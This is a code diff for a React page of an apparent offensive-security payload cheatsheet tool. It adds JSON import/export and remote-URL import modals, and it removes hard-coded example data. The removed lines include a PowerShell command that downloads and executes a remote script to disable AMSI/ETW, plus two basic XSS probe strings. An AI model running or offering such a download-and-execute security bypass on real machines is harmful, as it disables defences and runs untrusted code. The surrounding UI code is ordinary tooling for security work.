@@ -1,11 +1,78 @@
-import { Divider, Dropdown, Input, Table, Tag, Typography, message } from 'antd';
+import { ExportOutlined, FileSyncOutlined, ImportOutlined, QuestionCircleOutlined, ToolOutlined } from '@ant-design/icons';
+import { Button, Col, Divider, Dropdown, FloatButton, Input, Modal, Row, Table, Tag, Typography, message } from 'antd';
 import Fuse from 'fuse.js';
 import { useState } from 'react';
+import usePayloadStore, { DataType, exampleData } from './store';
+const { Title, Paragraph } = Typography;
+
 
 const index = () => {
 
+  const { exportPayloadsAsJSON, importPayloadFromURL, importPayloadsFromLocalFile, payloads, setPayloads, remotePayloadURL, setRemotePayloadURL } = usePayloadStore();
+
   const [messageApi, contextHolder] = message.useMessage();
   const [data, setData] = useState([]);
+
+  const [isHelpModalOpen, setIsHelpModalOpen] = useState(false);
+  const [isSyncModalOpen, setIsSyncModalOpen] = useState(false);
+
+  const handleFileImport = () => {
+    // Create a hidden file input
+    const fileInput = document.createElement('input');
+    fileInput.type = 'file';
+    fileInput.style.display = 'none';
+    fileInput.onchange = (event) => {
+      const target = event.target as HTMLInputElement;
+      if (target.files && target.files.length > 0) {
+        const file = target.files[0];
+        importPayloadsFromLocalFile(file);
+      } else {
+        console.log('No file selected');
+      }
+      // Remove the file input from the DOM
+      document.body.removeChild(fileInput);
+    };
+    document.body.appendChild(fileInput);
+    // Programmatically trigger a click on the file input
+    fileInput.click();
+  };
+  const showHelpModal = () => {
+    setIsHelpModalOpen(true);
+  };
+
+  const handleHelpModalOk = () => {
+    setIsHelpModalOpen(false);
+  };
+
+  const handleHelpModalCancel = () => {
+    setIsHelpModalOpen(false);
+  };
+
+  const showSyncModal = () => {
+    setIsSyncModalOpen(true);
+  };
+  const handleSyncModalOk = () => {
+    setIsSyncModalOpen(false);
+  };
+  const handleSyncModalCancel = () => {
+    setIsSyncModalOpen(false);
+  };
+
+
+  const structureForHelpModal = `[
+    {
+      "id": "UNIQUE-PAYLOAD-ID-001",
+      "name": "Payload Name",
+      "tags": ["Tag1", "Tag2"],
+      "description": "Payload description",
+      "substeps": [
+        {
+          "description": "payload  title 1",
+          "payload": "copyable payload 1"
+        }
+      ]
+    }
+  ]`;
 
   const fuseOptions = {
     keys:
@@ -18,51 +85,8 @@ const index = () => {
       ]
   }
 
-  interface DataType {
-    id: string;
-    name: string;
-    tags: string[];
-    description: string;
-    substeps: Substep[];
-  }
 
-  interface Substep {
-    description: string;
-    payload: string | null;
-  }
-
-  const exampleData: DataType[] = [
-    {
-      id: '1',
-      name: 'AMSI / ETW Bypass',
-      description: 'Bypass AMSI and ETW powershell payload',
-      substeps: [
-        {
-          description: 'Bypass AMSI/ETW',
-          payload: 'powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/3gstudent/Disable_AMSI/master/Disable_AMSI.ps1\');Disable-AMSI"',
-        },
-      ],
-      tags: ['Windows', 'Bypass', 'PowerShell'],
-    },
-    {
-      id: '2',
-      name: 'XSS',
-      description: 'XSS WAF bypassing payloads',
-      substeps: [
-        {
-          description: 'WAF bypass',
-          payload: '<script>alert(1)</script>',
-        },
-        {
-          description: 'WAF bypass',
-          payload: '<svg/onload=alert(1)',
-        },
-      ],
-      tags: ['XSS', 'WAF'],
-    },
-  ];
   const fuse = new Fuse(exampleData, fuseOptions);
-  const [searchResults, setSearchResults] = useState<DataType[]>(exampleData);
 
   const items = [
     {
@@ -88,10 +112,10 @@ const index = () => {
     console.log(value);
     if (value) {
       const results = fuse.search(value);
-      console.log({results})
-      setSearchResults(results.map(result => result.item));
+      console.log({ results })
+      setPayloads(results.map(result => result.item));
     } else {
-      setSearchResults(exampleData);
+      setPayloads(exampleData);
     }
   };
 
@@ -168,7 +192,68 @@ const index = () => {
     }
   ];
 
-  const { Title, Paragraph } = Typography;
+
+
+
+
+  const helpModal = (
+    <Modal title="How it works ?" open={isHelpModalOpen} onOk={handleHelpModalOk} onCancel={handleHelpModalCancel}
+      width={window.innerWidth > 800 ? 800 : window.innerWidth - 75}>
+
+      <Typography style={{ textAlign: "justify" }}>
+        Here you can create your own set of payloads and save them to find them quickly later.
+      </Typography>
+      <Divider />
+      <Paragraph>
+        You can fill it by importing a JSON file having the following structure for each payload :
+      </Paragraph>
+      <Paragraph code copyable={{ text: structureForHelpModal }}>
+        <pre>
+          {structureForHelpModal}
+        </pre>
+      </Paragraph>
+      <Divider />
+      <p>
+        You can export the current state of the checklist as a JSON file. This can be useful for saving progress or sharing methodologies or results with others.
+        Or even a CSV file that can be used in a spreadsheet software.
+      </p>
+    </Modal>
+  )
+
+  const syncModal = (
+    <Modal title="Payload management" open={isSyncModalOpen}
+      onOk={handleSyncModalOk} onCancel={handleSyncModalCancel}
+      width={window.innerWidth > 800 ? 800 : window.innerWidth - 75}>
+
+      <Row gutter={[16, 16]}>
+        <Col span={24}>
+          <Title level={3}>Export</Title>
+          <Button icon={<ExportOutlined />} onClick={exportPayloadsAsJSON}>
+            Export Payloads
+          </Button>
+        </Col>
+        <Col span={24}>
+          <Title level={3}>Local Import</Title>
+          <Button icon={<ImportOutlined />} onClick={handleFileImport}>
+            Import Payloads from Local File
+          </Button>
+        </Col>
+        <Col span={24}>
+          <Title level={3}>Remote Import</Title>
+          <Input
+            placeholder="Enter remote URL"
+            value={remotePayloadURL}
+            onChange={e => setRemotePayloadURL(e.target.value)}
+          />
+          <Button icon={<ImportOutlined />} onClick={importPayloadFromURL}>
+            Import Payloads from URL
+          </Button>
+        </Col>
+      </Row>
+      <Divider />
+
+    </Modal>
+  )
 
   return (
     <div>
@@ -178,14 +263,14 @@ const index = () => {
       </Paragraph>
 
       <Input.Search
-        placeholder="Search"
+        placeholder="Search for a payload or description "
         onChange={e => handleSearch(e.target.value)}
       />
       <Divider />
 
       <Divider />
 
-      <Table columns={columns} dataSource={searchResults} rowKey="id"
+      <Table columns={columns} dataSource={payloads} rowKey="id"
         expandable={{
           expandedRowRender: (record: DataType) =>
             <>
@@ -205,6 +290,27 @@ const index = () => {
             </>
         }}
       />
+
+
+
+      <FloatButton.Group
+        trigger="hover"
+        type="primary"
+        style={{ right: 24 }}
+        icon={<ToolOutlined />}
+      >
+        <FloatButton icon={<QuestionCircleOutlined />}
+          onClick={showHelpModal}
+        />
+        <FloatButton icon={<FileSyncOutlined />}
+          onClick={showSyncModal}
+        />
+      </FloatButton.Group>
+
+
+      {helpModal}
+      {syncModal}
+
     </div>
   );
 };
